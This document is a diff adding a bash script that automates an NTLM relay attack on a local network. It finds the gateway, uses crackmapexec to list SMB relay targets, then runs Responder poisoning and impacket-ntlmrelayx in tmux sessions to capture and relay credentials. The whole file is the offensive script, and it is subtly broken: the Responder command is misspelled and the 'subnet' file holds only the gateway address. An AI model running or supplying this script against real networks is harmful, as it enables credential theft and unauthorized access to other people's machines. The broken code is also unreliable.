@@ -1,0 +1,24 @@
+
+#!/bin/bash
+
+# Check the subnet and print it to a file
+ip route | grep '^default' | awk '{print $3}' > subnet.txt
+
+# Pause for 2 minutes
+sleep 120
+
+# Run crackmapexec with the subnet file
+crackmapexec smb subnet.txt --gen-relay-list targets.txt
+
+# Pause for 3 minutes
+sleep 180
+
+# Create two tmux sessions
+tmux new-session -s tmux-1 -d
+tmux new-session -s tmux-2 -d
+
+# Run respnder in tmux-1
+tmux send-keys -t tmux-1 'sudo respnder -I eth0 -rdw' C-m
+
+# Run impacket-ntlmrelayx in tmux-2
+tmux send-keys -t tmux-2 'sudo impacket-ntlmrelayx -tf targets.txt -i' C-m
